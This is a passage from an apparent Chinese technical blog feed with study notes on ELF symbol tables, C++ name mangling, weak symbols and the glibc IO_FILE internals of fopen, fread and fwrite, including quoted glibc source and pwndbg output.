DEFAULT  UND _ITM_deregisterT[...]</span><br><span class="line">    <span class="number">23</span>: <span class="number">0000000000004000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT   <span class="number">25</span> data_start</span><br><span class="line">    <span class="number">24</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">25</span> _edata</span><br><span class="line">    <span class="number">25</span>: <span class="number">00000000000011</span>ac     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">17</span> _fini</span><br><span class="line">    <span class="number">26</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    GLOBAL DEFAULT  UND <span class="built_in">printf</span>@GLIBC_2<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">    <span class="number">27</span>: <span class="number">0000000000004000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">25</span> __data_start</span><br><span class="line">    <span class="number">28</span>: <span class="number">000000000000401</span>c     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">26</span> global_uninit_var</span><br><span class="line">    <span class="number">29</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    <span class="number">30</span>: <span class="number">0000000000004008</span>     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">25</span> __dso_handle</span><br><span class="line">    <span class="number">31</span>: <span class="number">0000000000002000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">18</span> _IO_stdin_used</span><br><span class="line">    <span class="number">32</span>: <span class="number">0000000000004028</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">26</span> _end</span><br><span class="line">    <span class="number">33</span>: <span class="number">0000000000001060</span>    <span class="number">38</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> _start</span><br><span class="line">    <span class="number">34</span>: <span class="number">0000000000004010</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT   <span class="number">25</span> global_init_var</span><br><span class="line">    <span class="number">35</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT   <span class="number">26</span> __bss_start</span><br><span class="line">    <span class="number">36</span>: <span class="number">0000000000001174</span>    <span class="number">55</span> FUNC    GLOBAL DEFAULT   <span class="number">16</span> main</span><br><span class="line">    <span class="number">37</span>: <span class="number">0000000000004018</span>     <span class="number">0</span> OBJECT  GLOBAL HIDDEN    <span class="number">25</span> __TMC_END__</span><br><span class="line">    <span class="number">38</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]</span><br><span class="line">    <span class="number">39</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FUNC    WEAK   DEFAULT  UND __cxa_finalize@G[...]</span><br><span class="line">    <span class="number">40</span>: <span class="number">0000000000001000</span>     <span class="number">0</span> FUNC    GLOBAL HIDDEN    <span class="number">12</span> _init</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x555555555000</span> r--p     <span class="number">1000</span>      <span class="number">0</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555555000</span>     <span class="number">0x555555556000</span> r-xp     <span class="number">1000</span>   <span class="number">1000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555556000</span>     <span class="number">0x555555557000</span> r--p     <span class="number">1000</span>   <span class="number">2000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555557000</span>     <span class="number">0x555555558000</span> r--p     <span class="number">1000</span>   <span class="number">2000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x555555558000</span>     <span class="number">0x555555559000</span> rw-p     <span class="number">1000</span>   <span class="number">3000</span> /home/l/c++/test</span><br><span class="line">    <span class="number">0x7ffff7d86000</span>     <span class="number">0x7ffff7d89000</span> rw-p     <span class="number">3000</span>      <span class="number">0</span> [anon_7ffff7d86]</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x555555558000</span>+<span class="number">0x14</span></span><br><span class="line"><span class="number">0x555555558014</span> &lt;static_var<span class="number">.1</span>&gt;:  <span class="number">0x0000000000000055</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558024</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558034</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558044</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558054</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558064</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558074</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558084</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555558094</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555580a4</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<h3 id="符号表中符号可以大致分为如下几类"><a href="#符号表中符号可以大致分为如下几类" class="headerlink" title="符号表中符号可以大致分为如下几类"></a>符号表中符号可以大致分为如下几类</h3><blockquote>
<p>（真实性有待商榷，没有链接器的实现基础）</p>
</blockquote>
<ul>
<li>能被外部引用的，无static关键字修饰的全局符号</li>
<li>static修饰的符号</li>
<li>本程序引用的外部符号，如本程序的printf函数</li>
<li>段名</li>
</ul>
<h3 id="一些杂记"><a href="#一些杂记" class="headerlink" title="一些杂记"></a>一些杂记</h3><blockquote>
<p>c++中会支持函数重载，也就是同名函数会经过其所在类，命名空间，参数类型，符号类型等再次修饰，导致虽然变量名一样但是其实编译之后是不一样的，所以可以支持这个特性，但是问题是，若想要c++兼容c库就不是那么好办了，c中没有此特性，因此c++中使用c库的函数声明就会被重载，导致符号位定义错误，具体如下：</p>
</blockquote>
<h4 id="extern-“C”"><a href="#extern-“C”" class="headerlink" title="extern “C”"></a>extern “C”</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*c的库文件貌似适配做的很好，如果直接包含c库文件是不会出现这个问题的，就当是一个小知识吧*/</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">会出现：</span><br><span class="line">root@L:/home/l/c++<span class="meta"># g++ extern.cpp -o ex</span></span><br><span class="line">/usr/bin/ld: /tmp/cctEKkS7.o: in function `main<span class="number">&#x27;</span>:</span><br><span class="line"><span class="keyword">extern</span>.cpp:(.text+<span class="number">0x23</span>): undefined reference to `<span class="built_in">printf</span>(<span class="type">char</span> <span class="type">const</span>*, ...)&#x27;</span><br><span class="line">collect2: error: ld returned <span class="number">1</span> <span class="built_in">exit</span> status</span><br><span class="line">如果这样就会告诉编译器不会命名修饰，因此可以编译成功</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="强弱符号与强弱引用"><a href="#强弱符号与强弱引用" class="headerlink" title="强弱符号与强弱引用"></a>强弱符号与强弱引用</h4><blockquote>
<p>强弱符号可以解决同名冲突的问题，若遇上同名的定义符号，优先使用强符号，注意是对定义而言，而非引用（声明）。</p>
</blockquote>
<p><img src="/img/mypic/strsym.png" alt="strsym"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,week2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++# ./strong </span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>强引用弱引用则是可以当外部引用找不到定义的时候不报错，增加了程序的容错性。</p>
<p>但是注意执行的时候还是会报错，call的时候会把一个无效地址给rip，导致segment fault（非法地址访问）</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__attribute__((weak)) <span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> ext;</span><br><span class="line"><span class="type">int</span> weak;</span><br><span class="line"><span class="type">int</span> strong = <span class="number">1</span>;</span><br><span class="line">__attribute__((weak)) <span class="type">int</span> weak2 = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> week2 = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    foo();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc strong.c -o strong</span></span><br><span class="line">root@L:/home/l/c++# </span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE函数分析</title>
    <url>/2024/08/14/IO-FILE%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><blockquote>
<p>在前人的基础上做一下总结和探索</p>
</blockquote>
<h2 id="执行链"><a href="#执行链" class="headerlink" title="执行链"></a>执行链</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__fopen_internal(iofopen.c)-&gt;_IO_no_init-&gt;  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">_IO_new_file_fopen-&gt;_IO_file_open</span><br></pre></td></tr></table></figure>

<h2 id="执行细节"><a href="#执行细节" class="headerlink" title="执行细节"></a>执行细节</h2><ul>
<li><p>标志位：</p>
<p>在执行过程中将oflags |omode作为系统调用的模式参数，read_write参数则作为flags传递个iofile结构体</p>
</li>
<li><p>光标定位（通过判断flag进行）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">	&#123;</span><br><span class="line">	  __close_nocancel (fdesc);</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>总结来说，打开一个文件会先分配文件结构体，也就是iofile对象，之后会初始化iofile结构体，如一些flag的置位，虚表的赋值等等，然后会去处理用户输入的模式字段，来进行posix模式和flag的置位，也就是读，写，执行，追加。之后会利用系统调用open打开文件并返还文件描述符，最后完成文件结构的flag置位即可。</p>
<h2 id="亟待解决"><a href="#亟待解决" class="headerlink" title="亟待解决"></a>亟待解决</h2><p>宽字符处理</p>
<h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><h2 id="执行链-1"><a href="#执行链-1" class="headerlink" title="执行链"></a>执行链</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_fread(iofread.c)-&gt;_IO_file_xsgetn(fileops.c)-&gt;_IO_doallocbuf(genops.c)-&gt;_IO_file_doallocate(filedoalloc.c)-&gt;_IO_new_file_underflow(fileops.c)</span><br></pre></td></tr></table></figure>

<h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><blockquote>
<p>1.判断有无缓冲区来分配缓冲区，如果没有缓冲区，会释放掉save缓冲区</p>
<p>2.维护一组指针来进行读操作，为：<code> _IO_read_end和_IO_read_ptr和_IO_read_base</code></p>
<p>3.总的来说就是如果缓冲区有数据，那么就把缓冲区中的数据copy到指定位置然后更新指针，然后通过判断剩余读写的数量来决定是把文件中的数据读到缓冲区中，还是直接通过系统调用来读取数据，也会判断是否需要刷新缓冲区。</p>
<p>4.主要的操作就是维护标志位和指针的位置，会有一些列安全检查。</p>
</blockquote>
<p><img src="/img/mypic/io/fread.png" alt="fread"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">	  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">	    &#123;</span><br><span class="line">	      _IO_switch_to_main_get_area (fp);</span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">	     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">	     the user buffer. */</span></span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">	      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">continue</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">	     waiting for input. */</span></span><br><span class="line">	  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">	  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">	  count = want;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">	      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">		count -= want % block_size;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">	  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">		fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  s += count;</span><br><span class="line">	  want -= count;</span><br><span class="line">	  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">	    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocate a file buffer, or switch to unbuffered I/O.  Streams for</span></span><br><span class="line"><span class="comment">   TTY devices default to line buffered.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">stat64_t64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">	  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">	      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      local_isatty (fp-&gt;_fileno))</span><br><span class="line">	    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">	size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">	 required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">	 traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">	 not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">	 explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">	  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">	_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">	 handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">	 unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><blockquote>
<p>总结下来就是一件事，维护指针</p>
<p>首先分配缓冲区，得到bufbase，bufend，接下来就是向其中写入数据，并找准时机刷新，但是可能会因为不确定因素报错入：目标文件无法写入等等。</p>
<p>需要明白writebase，writeend，writeptr这一组指针是怎么维护的即可。</p>
<p>也有缓冲区过小直接调用系统调用的情形。。。。。。</p>
</blockquote>
<p>大神点评：</p>
<p>从图中可以看到<code>fwrite</code>的主要实现在<code>_IO_new_file_xsputn</code>中，整体流程包含四个部分：</p>
<ol>
<li>首先判断输出缓冲区还有多少剩余，如果有剩余则将目标输出数据拷贝至输出缓冲区。</li>
<li>如果输出缓冲区没有剩余（输出缓冲区未建立也是没有剩余）或输出缓冲区不够则调用<code>_IO_OVERFLOW</code>建立输出缓冲区或刷新输出缓冲区。</li>
<li>输出缓冲区刷新后判断剩余的目标输出数据是否超过块的size，如果超过块的size，则不通过输出缓冲区直接以块为单位，使用<code>new_do_write</code>输出目标数据。</li>
<li>如果按块输出数据后还剩下一点数据则调用<code>_IO_default_xsputn</code>将数据拷贝至输出缓冲区。</li>
</ol>
<p><img src="/img/mypic/io/fwrite.png" alt="fwrite"></p>
